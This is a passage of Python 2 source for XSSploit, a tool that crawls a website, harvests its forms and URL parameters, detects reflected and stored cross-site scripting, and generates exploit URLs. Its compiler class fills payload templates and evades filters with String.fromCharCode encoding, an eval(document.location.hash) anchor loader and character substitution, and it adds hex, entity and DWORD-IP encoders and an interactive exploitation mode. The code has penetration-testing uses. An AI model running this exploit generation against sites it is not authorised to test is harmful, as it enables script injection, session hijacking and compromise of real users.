        self._baseDomain=baseURL[:baseURL.rfind('/', 7)]
        while len(self._urlToSearch)<>0:
            #Get the HTML
            htmlCode=self.getPage(self._urlToSearch[0])  
            self._urlSearched.append(self._urlToSearch[0])
            if htmlCode:
                self.getReferences(self._urlToSearch[0],  htmlCode)
                self.getForms(self._urlToSearch[0],  htmlCode)
            self._urlToSearch.remove(self._urlToSearch[0])
        return self.formDB

    def spiderPermanent(self):
        """
        Spiders a site to find any permanent XSS marker
        @return: A list containing url-pattern lists
        """
        self._clean()
        self._urlToSearch.append(_BASEURL)
        while len(self._urlToSearch)<>0:
            #Get the HTML
            htmlCode=self.getPage(self._urlToSearch[0])  
            self._urlSearched.append(self._urlToSearch[0])
            if htmlCode:
                self.getReferences(self._urlToSearch[0],  htmlCode)
                self.searchPattern(self._urlToSearch[0],  htmlCode)
            self._urlToSearch.remove(self._urlToSearch[0])
        return self.patternFound

    def login(self,  url):
        """
        Authenticates on a site. The script will help you filling the login forms and set the session cookies for you.
        @type url: String
        @param url: The URL of the login page
        @return: Nothing, but sets session cookies in the wwwIO instance
        """
        requestParams=[]
        html=self.getPage(url)
        self.getForms(url,  html)
        fDB=self.formDB

        print 'Select the form to login :'
        for form in fDB._forms:
            print str(form[0]) + ' : ' + form[1]

        id=int(raw_input('Choice : '))
        print 'Now select the values for the fields :'

        for param in fDB.getParamNames(id):
            value = raw_input(param+'('+fDB.getParamValues(id,  param)[0]+') : ')
            if value=='':
                value=fDB.getParamValues(id,  param)[0]
            requestParams.append((param, value ))
            
        requestParams=dict(requestParams)
        self.httpInject(fDB._forms[id][1], requestParams,  fDB._forms[id][2])
        logging.debug('Cookies created : ')
        for index, cookie in enumerate(self._cookiejar):
            logging.debug(str(index) + '  :  ' + str(cookie))
        del self.formDB
        self.formDB=formDB()

    def searchPattern(self,  url,  htmlCode):
        """
        Searches for XSSploit markers in HTML code
        @type url: String
        @param url: The URL of the page
        @type htmlCode: List
        @param htmlCode: The HTML code, in list format
        @return: Nothing, but modifies the patternFound instance variable
        """
        regexp=re.compile('\([\w\d]{'+str(xssAnalyzer.PATTERNLENGTH)+'}\)',  re.IGNORECASE)
        for line in htmlCode:
            for pattern in re.finditer(regexp, line):
                self.patternFound.append([pattern.group(),  url])

    def getReferences(self,  url,  htmlCode):  
        """
        Finds any links in the HTML code in a page
        @type url: String
        @param url: The url for the page
        @type htmlCode: List
        @param htmlCode: The HTML code to parse
        @return: Nothing, but modifies urlFound and _urlToSearch
        """
        htmlCode=BeautifulSoup.BeautifulSoup(htmlCode)
        regexp=self._createRegexp()
        folder=self.getFolder(url) 
        for link in re.finditer(regexp, str(htmlCode)):
            strLink=link.group()
            finalLink=self.filterUrl(strLink,  folder)
            logging.debug('Link found : '+finalLink)
            self.extractUrlParams(finalLink)
            self.addUrlToSearch(finalLink)
            self.urlFound.append(finalLink)

    def extractUrlParams(self,  url):
        """
        Extracts parameters in links
        @type url: String
        @param url: The full URL
        """
        if url.find(self._baseDomain)==0:
            if url.find('?')<>-1:
                logging.debug('Found URL with parameters : '+ url)
                lsParams=url[url.find('?')+1:].split('&')
                for param in lsParams:
                    lsParam=param.split('=')
                    #We keep only the page URL
                    if len(lsParam)>1:
                        self.formDB.addParam(self.formDB.addForm(url[:url.find('?')] ,  'GET'),  lsParam[0],  lsParam[1])

    def getForms(self,  url,  htmlCode):
        """
        Looks for all input fields in the HTML code - BeautifulSoup version
        @type url: String
        @param url: The url for the page
        @type htmlCode: List
        @param htmlCode: The HTML code to parse
        """
        code=BeautifulSoup.BeautifulSoup(htmlCode)
        #For each form...
        for form in code.findAll('form'):
            formName=''
            formMethod=''
            formAction=''
            formValue=''
            #Get the values
            try:
                formAction=form['action']
            except KeyError:
                formAction=url
            try:
                formMethod=form['method']
            except KeyError:
                formMethod='GET'
            try:
                formValue=form['value']
            except KeyError:
                formValue=''
            #We tell the page is the same without parameters
            if formAction.find('?')<>-1:
                formAction=formAction[:formAction.find('?')]
            if formAction=='' or formAction=='.':
                formAction=url
            #Add the form values in the formDB
            formAction=self.filterUrl(formAction,  self.getFolder(url)) #Filters the form action
            self.extractUrlParams(formAction)
            formID=self.formDB.addForm(formAction,  formMethod)
            if formValue<>'':
                self.formDB.addParam(formID,  'form',  formValue)
            #Check all the input fields and add them
            if form.input is not None:
                for input in form.findAll('input'):
                    try:
                        inputType=input['type'].lower()
                    except KeyError:
                        inputType=''
                    if inputType=='submit':
                        break
                    inputName=''
                    try:
                        inputName=input['name']
                    except KeyError:
                        inputName=''
                    try:
                        inputValue=input['value']
                    except KeyError:
                        inputValue=''
                    self.formDB.addParam(formID,  inputName,  inputValue)
            if form.select is not None:
                for select in form.findAll('select'):
                    selectName=select['name']
                    for option in select.findAll('option'):
                        selectValue=str(option.string)
                        self.formDB.addParam(formID,  selectName,  selectValue)
            

    def httpInject(self,  url,  params='',  method='get'):
        """
        Injects parameters in a page
        @type url: String
        @param url: The URL to the page
        @type params: Dictionary
        @param params: The parameters to inject 
        @type method: String
        @param method: The method to use (get or post)
        @return: The HTTP response or an empty string on error
        """
        if method=='post':
            req = urllib2.Request(url,  urllib.urlencode(params))
        else:
            method='get'
            req = urllib2.Request(self.buildGetQuery(url,  params))
        try:
            logging.debug('Sending '+method+' request to '+req.get_full_url()+': '+str(params))
            f=urllib2.urlopen(req)
            return f.read()
        except urllib2.HTTPError,  e:
            logging.error('Error '+str(e.code)+' on '+url)
            return ''
        except urllib2.URLError,  e:
            logging.error('Invalid URL : '+url)
            return ''
        except socket.error,  e:
            logging.warning('Timeout on '+url)
            return ''
        except:
            return ''

    def buildGetQuery(self,  url,  params):
        """
        builds a query to send to a page
        @type url: String
        @param url: The url to the destination page
        @type params: Dictionnary
        @param params: The fields and values to build
        @return: The url with the fields
        """
        params=urllib.urlencode(params)
        return url+'?'+params

    def xmlDump(self):
        """
        Dumps the scanned pages in XML format
        @return: An ElementTree item containing The URLs scanned
        """
        root=etree.Element("Urls")
        for url in self._urlSearched:
            Url=etree.SubElement(root,  "URL")
            Url.set('value',  url)
        return root

class formDB:
    """
    Stores informations about _forms and parameters
    """

    def __init__(self):
        self._forms=[]
        """Stores the forms structured as (ID, destination, method)"""
        self._params=[]
        """Stores the parameters as (form ID, name, value)"""

    def addForm(self,  destination,  method):
        """
        Adds a new form in the forms DB
        @type destination: String
        @param destination: The destination script
        @type method: String
        @param method: The method used
        @return: The form ID
        """
        #If there is no indication, defaults to GET
        if method=='':
            method='get'
        method=method.lower()
        if method=='get' and destination.find('?')<>-1:
            destination=destination[:destination.find('?')]  #We only keep the destination page
        form_id=len(self._forms)
        for form in self._forms:
            if form[1]==destination and form[2]==method:
                return form[0] #Already exists -> returns the existing ID
        self._forms.append((form_id, destination,  method))
        logging.debug('Form '+ str(form_id)+' added : '+destination+' -> '+method)
        return form_id

    def addParam(self,  form_id,  name,  value=''):
        """
        Adds a parameter to a script in the forms DB
        @type form_id: Integer
        @param form_id: The form ID (must be in the DB)
        @type name: String
        @param name:  The parameter name
        @type value: String
        @param value: Optionnal - The default value found
        """
        #Dirty hack for HTML codes
        if name.find('&quot;')<>-1:
            return
        for param in self._params:
            if param[0]==form_id and param[1]==name and param[2]==value and name<>'':
                return #Already exists -> get out
        self._params.append((form_id,  name,  value))
        logging.debug('Parameter added : '+str(form_id)+' : '+name+'='+value)

    def getFormID(self,  url):
        """
        Gets the form ID from the script's URL
        @type url: String
        @param url: The destination URL
        @return: The form ID
        """
        for form in self._forms:
            if form[2]==url:
                return form[0]
    
    def getFormUrl(self,  formID):
        """
        Returns the form URL from the form ID
        @type formID: Integer
        @param formID: the form ID
        @return: The form's URL
        """
        for form in self._forms:
            if form[0]==formID:
                return form[1]
    
    def getFormMethod(self,  formID):
        """
        Returns the form method from the form ID
        @type formID: Integer
        @param formID: the form ID
        @return: The form's method
        """
        for form in self._forms:
            if form[0]==formID:
                return form[2]
    
    def getFormParams(self,  form_id):
        """
        Retreives all the parameters for a form
        @type form_id: Integer
        @param form_id: The form ID
        @return: A list containing all the parameters
        """
        formParams=[]
        for param in self._params:
            if param[0]==form_id:
                formParams.append(param)
        return formParams
    
    def getParamNames(self,  form_id):
        """
        Retrieves all the parameter names for a form
        @type form_id: Integer
        @param form_id:  The form ID
        @return: A list containing all the parameter names
        """
        formParamNames=[]
        for param in self._params:
            if param[0]==form_id and param[1] not in formParamNames:
                formParamNames.append(param[1])
        return formParamNames
    
    def getParamValues(self,  form_id,  paramName):
        """
        Retrieves all the values found for a parameter
        @type form_id: Integer
        @param form_id:  The form ID
        @type paramName: String
        @param paramName:  The parameter's name
        @return: A list containing all the parameter values
        """
        formParamNames=[]
        for param in self._params:
            if param[0]==form_id and param[1]==paramName:
                formParamNames.append(param[2])
        return formParamNames
    
    def printSummary(self):
        """
        Prints out all the forms and fields in the form DB
        """
        for form in self._forms:
            print str(form[0]) + ' : ' + form[1]+' -> '+form[2]
            for param in self.getFormParams(form[0]):
                print ' -> ' + param[1] + '=' + param[2]

    def xmlDump(self):
        """
        Dumps the formDB in XML format
        @return: An ElementTree item containing the form database
        """
        root = etree.Element("forms")
        for form in self._forms:
            Form=etree.SubElement(root, "form")
            Form.set("url", form[1])
            Form.set("method", form[2])
            for param in self.getParamNames(form[0]):
                for value in self.getParamValues(form[0],  param):
                    Param=etree.SubElement(Form,  "parameter")
                    Param.set("name", param)
                    Param.set("value", value)
        return root

    def write(self,  filename):
        """
        Saves the formDB in XML format
        @type filename: String
        @param filename: The name of the XML file
        """
        root = etree.Element("forms")
        for form in self._forms:
            Form=etree.SubElement(root, "form")
            Form.set("url", form[1])
            Form.set("method", form[2])
            for param in self.getParamNames(form[0]):
                for value in self.getParamValues(form[0],  param):
                    Param=etree.SubElement(Form,  "parameter")
                    Param.set("name", param)
                    Param.set("value", value)
        file=open(filename,  "w")
        file.write((etree.tostring(root)))
        file.close()
    
    def load(self,  filename):
        """
        Loads a formDB from a XML file
        @type filename: String
        @param filename: The name of the XML file
        """
        if os.path.exists(filename):
            file=open(filename,  "r")
            data=file.read()
            file.close()
            root=etree.XML(data)
            for form in root:
                formUrl=form.get("url")
                formMethod=form.get("method")
                formID=self.addForm(formUrl,  formMethod)
                for param in form:
                    formParamName=param.get("name")
                    formParamValue=param.get("value")
                    if formParamValue is None:
                        formParamValue=''
                    self.addParam(formID,  formParamName,  formParamValue)
        else:
            logging.error('The file '+filename+' cannot be loaded')
            print 'Error, the file cannot be loaded'

class report:
    """Reporting object. Creates the XML reports"""
    def __init__(self):
        self._XMLRoot=etree.Element("XSSploitScan")
        self._XMLRoot.set('date',  time.asctime(time.localtime()))
    
    def __str__(self):
        """Prints the XML report"""
        return etree.tostring(self._XMLData)
    
    def addItem(self,  object,  custom=None):
        """
        Adds an object to the report
        @type object: Any XSSploit object (wwwIO, formDB, xss, ...)
        @param object: The object to include in the report
        @type custom: Tuple
        @param custom: Custom attribute to add in the XML entity (name,value)
        """
        try:
            xmlData=object.xmlDump()
            if custom is not None:
                Element=etree.SubElement(xmlData,  custom[0])
                Element.text=custom[1]
            self._XMLRoot.append(xmlData)
        except AttributeError:
            logging.error('Object has no attribute xmlDump() : '+str(object))
    
    def write(self,  filename):
        """
        Writes the XML report in a file
        @type filename: string
        @param filename: The file name
        """
        file=open(filename,  "w")
        file.write('<?xml version="1.0" encoding="ISO-8859-1"?>')
        file.write('<?xml-stylesheet type="text/xsl" href="report.xsl"?>')
        file.write((etree.tostring(self._XMLRoot)))
        file.close()
        logging.debug('Wrote report in '+os.getcwd()+' -> '+filename)

class compiler:
    """
    Compiles an exploit for an XSS
    """
    
    def __init__(self):
        #TODO: Add wwwIO instance to validate the exploit
        self._exploitDB=''
        """Stores the exploits database in an ElementTree"""
        self.exploits={}
        """Stores the exploits"""
        self.options={}
        """Stores the options for the current exploit"""
        self._activeExploit=''
        """Stores the active exploit and the parameters"""
        self.exploitCode=''
        """Stores the active exploit's code"""
        self.loadExploits()
    
    def loadExploits(self,  filename='exploits.xml'):
        """
        Loads exploits from an XML file
        @type filename: String
        @param filename: the file to load
        """
        if os.path.exists(filename):
            file=open(filename,  "r")
            data=file.read()
            file.close()
            root=etree.XML(data)
            self._exploitDB=root
            for exploit in self._exploitDB:
                self.exploits.update({exploit.get('name'):exploit.find('description').text})
    
    def list(self):
        print 'Printing exploits :'
        print 'Name \t\t\tDescription'
        for item in self.exploits:
            print item + '\t\t' + self.exploits[item]

    def select(self,  exploitName):
        """
        Selects an exploit to be the active exploit
        @type exploitName: String
        @param exploitName: the name of the exploit
        """
        if exploitName in self.exploits.keys():
            self.options={}
            self._activeExploit=exploitName
            for xploit in self._exploitDB:
                if xploit.get('name')==exploitName:
                    self.exploitCode=xploit.find('code').text
                    for option in xploit.findall('option'):
                        self.options.update({option.get('name'):option.get('value')})
    
    def set(self,  optionName,  optionValue):
        """
        Sets the value of an option
        @type optionName: String
        @param optionName: The name of the option
        @type optionValue: String
        @param optionValue: The value of the option
        """
        self.options[optionName]=optionValue
    
    def _getExploitCode(self):
        """
        Builds the exploit code with the options
        """
        finalCode=self.exploitCode
        regexp = re.compile("%(\w*)%")
        for var in regexp.findall(self.exploitCode):
            finalCode=finalCode.replace('%'+var+'%',  self.options[var])
        return finalCode

    def exploit(self,  xssObject):
        """
        Compiles the current exploit for the given XSS
        @type xssObject: xss
        @param xssObject: The xss inctance to exploit
        @return: A string containing the evil URL
        """
        if xssObject._exploitable==xss.NOEXPLOIT:
            logging.debug('XSS not exploitable')
            return 'Sorry, cannot exploit this XSS, try to do it manually'
        if self._activeExploit=='' :
            return 'Please select an exploit and configure it before launching exploit'
        if xssObject.method=='get':
            codeInAnchor=''
            params={}
            #Retreive the exploit code
            xssCode=self._getExploitCode()
            params.update(xssObject.parameters)
            #If there are strings in the code transform it in String.fromCharCode encoding
            if xssCode.find('"')<>-1 or xssCode.find("'")<>-1:
                if '"' in xssObject.badChars or "'" in xssObject.badChars:
                    xssCode='eval(String.fromCharCode('+self._fromCharCodeEncode(xssCode)+'))'
                        #If the code is in lowercase or if we can only launch one command, use the anchor loader
            if xssObject._charModifier==xss.LOWERCASE or xssObject._exploitable==xss.ONECOMMANDEXPLOIT:
                codeInAnchor=xssCode
                xssCode="eval(document.location.hash.substr(1))"
            #Put the escape characters and the code together
            xssCode=xssObject.escapeHeader+xssCode+xssObject.escapeTrailer
            #Modify all the chars that can be replaced :
            if ' ' in xssObject.badChars:
                xssCode=xssCode.replace(' ', '\t')
            #Fiinal check : If any of the bad chars are in the exploit code, we will use the anchor loader
            if codeInAnchor<>'':
                for char in xssObject.badChars:
                    if char in xssCode:
                        codeInAnchor=xssCode
                        xssCode="eval(document.location.hash.substr(1))"
                        break
            #Define the full request
            params.update({xssObject.vulnerableParameter:xssCode})
            tmp=wwwIO()
            URL=tmp.buildGetQuery(xssObject.url,  params)
            if codeInAnchor<>'':
                URL=URL+'#'+codeInAnchor
            return URL
        else:
            return 'Sorry, cannot exploit POST XSS now'

    def _hexEncode(self,  string):
        """
        Encodes a string in hex digits
        For example, 'XSS' becomes '%58%53%53'
        @type string: String
        @param string: The string to encode
        @return: The encoded string
        """
        encoded=''
        for char in string:
            encoded=encoded+"%"+hex(ord(char))[2:]
        return encoded

    def _hexSemiEncode(self,  string):
        """
        Encodes a string in hex digits with semicolons
        For example, 'XSS' becomes '&#x58;'&#x53;&#x53;
        @type string: String
        @param string: The string to encode
        @return: The encoded string
        """
        encoded=''
        for char in string:
            encoded=encoded+"&#x"+hex(ord(char))[2:]+";"
        return encoded

    def _decEncode(self,  string):
        """
        Encodes a string in dec digits
        For example, 'XSS' becomes '&#88&#83&#83'
        @type string: String
        @param string: The string to encode
        @return: The encoded string
        """
        encoded=''
        for char in string:
            encoded=encoded+"&#"+str(ord(char))
        return encoded

    def _fromCharCodeEncode(self,  string):
        """
        Encodes a string in dec digits to use directly in Javascript's String.fromCharCode function
        For example, 'XSS' becomes '88,83,83'
        @type string: String
        @param string: The string to encode
        @return: The encoded string
        """
        encoded=''
        for char in string:
            encoded=encoded+","+str(ord(char))
        return encoded[1:]

    def _ipDwordEncode(self,  string):
        """
        Encodes an IP address in DWORD format
        For example, '127.0.0.1' becomes '2130706433' 
        @type string: String
        @param string: The string to encode
        @return: The encoded IP as string
        """
        encoded=''
        tblIP = string.split('.')
        #In the case it's not an IP
        if len(tblIP)<>4:
            return 0
        for number in tblIP:
            tmp=hex(int(number))[2:]
            if len(tmp)==1:
                tmp='0'+tmp
            encoded=encoded+tmp
        return int(encoded,16)

#
#Command options
#

def createReport(filename):
    """XML report generation"""
    print 'Writing the xml report...'
    rpt=report()
    rpt.addItem(WWWIOINSTANCE)
    rpt.addItem(formDBInstance)
    for item in xssCollection:
        rpt.addItem(item)
    rpt.write(filename)

def help():
    """
    Prints the help message
    """
    print 'XSSploit ' + str(__VERSION)
    print 'Usage : xssploit.py url [options]'
    print ''
    print 'Available options :'
    print '-a user:pass'
    print 'Use HTTP authentication.'
    print '-d filename'
    print 'Disable permanent XSS scanning'
    print '-h or --help'
    print 'Prints this help'
    print '-i'
    print 'Interactive mode. After the scan is done, XSSploit lets you exploit the XSS found.'
    print '-l filename'
    print 'Saves a log file in filename.'
    print '-p proxyString'
    print 'Use a proxy. for instance http://user:pass@user:port'
    print '-t'
    print 'Test. When the scan finishes, all XSS will be followed with an URL with a Messagebox script'
    print '-v'
    print 'Prints the version'
    print '-w filename'
    print 'Writes the report in filename'
    print '-x url'
    print 'Excludes this URL, you can provide a REGEXP'
    

#
#Main
#
if __name__ == '__main__':
    #Load readline module
    if _READLINE==1:
        readline.parse_and_bind("tab: complete")
    #If no arguments are provided, launch the command line
    if len(sys.argv)==1:
        code.interact(banner='Welcome to XSSploit',  local=globals())
        sys.exit(0)
    else:
        #Display help
        if sys.argv[1] in ("-h", "--help"):
            help()
            sys.exit(0)
        elif sys.argv[1] == '-v':
            print 'XSSploit '+str(__VERSION)
            sys.exit(0)
    #Get the command line arguments
    try:
        opts, args = getopt.getopt(sys.argv[2:], "dl:p:a:hiw:tx:v", ["help"])
    except getopt.GetoptError, err:
        # print help information and exit:
        print str(err)
        help()
        sys.exit(2)
    
    permCheck=1
    """Checks if we need to do a permanent XSS scan"""
    for o, a in opts:
        #Define log file
        if o == "-l":
            logging.basicConfig(level=logging.DEBUG, format='%(levelname)s %(message)s', filename=a, filemode='w')
            logging.info('logging in '+a)
    #Define the wwwIO instance
    WWWIOINSTANCE=wwwIO()
    for o, a in opts:
        #Define the proxy Handler
        if o == '-p':
            WWWIOINSTANCE.proxyConfig(a)
        #Define the basic auth Handler
        elif o == '-a':
            a=a.split(':')
            WWWIOINSTANCE.authConfig(a[0],  a[1])
        elif o == '-x':
            WWWIOINSTANCE.excludeUrl(a)
        #Enable/disable the permanent XSS check
        elif o == '-d':
            permCheck=0
            
    #Main operations : Scan and check for XSS
    WWWIOINSTANCE.setTimeout(5)
    print 'Spidering the site...'
    formDBInstance=WWWIOINSTANCE.spider(sys.argv[1])
    print 'Analyzing the forms...'
    xssAnalyzerInstance=xssAnalyzer(WWWIOINSTANCE)
    xssAnalyzerInstance.setAnalysisMode(2)
    xssCollection=xssAnalyzerInstance.analyzeFormDB(formDBInstance,  permCheck)
    for item in xssCollection:
        xssAnalyzerInstance.analyzeXSS(item)
        item.printSummary()
    for o, a in opts:
        #If we need to provide a test URL...
        if o == "-t":
            COMPILERINSTANCE=compiler()
            COMPILERINSTANCE.select('messagebox')
            for item in xssCollection:
                item.printSummary()
                print COMPILERINSTANCE.exploit(item)
    for o, a in opts:
    #Create a report if needed
        if o=="-w":
            createReport(a)
    for o, a in opts:
        #Get in interactive mode
        if o == '-i':
            code.interact(banner='\n\nWelcome to XSSploit\nXSS are stored in the xssCollection list',  local=globals())
